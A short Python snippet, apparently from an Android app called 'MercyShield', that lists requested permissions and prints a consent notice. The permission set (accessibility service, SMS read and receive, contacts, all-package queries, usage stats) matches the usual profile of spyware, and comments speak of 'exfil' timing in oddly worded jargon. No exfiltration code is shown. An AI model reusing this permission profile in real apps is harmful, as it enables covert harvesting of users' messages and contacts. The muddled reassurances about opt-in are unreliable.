PERMISSIONS = [
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.QUERY_ALL_PACKAGES",
    "android.permission.BIND_ACCESSIBILITY_SERVICE",
    "android.permission.RECEIVE_SMS",
    "android.permission.READ_SMS",
    "android.permission.READ_CONTACTS",
    "android.permission.FOREGROUND_SERVICE",  # Network exfil background grace
    "android.permission.PACKAGE_USAGE_STATS"  # Data usage query (user enable in settings)
]

def request_permissions():
    print("MercyShield network deepen: Requests USAGE_STATS for exfil rhythm — opt-in, settings enable, explained pure. Revoke anytime.")
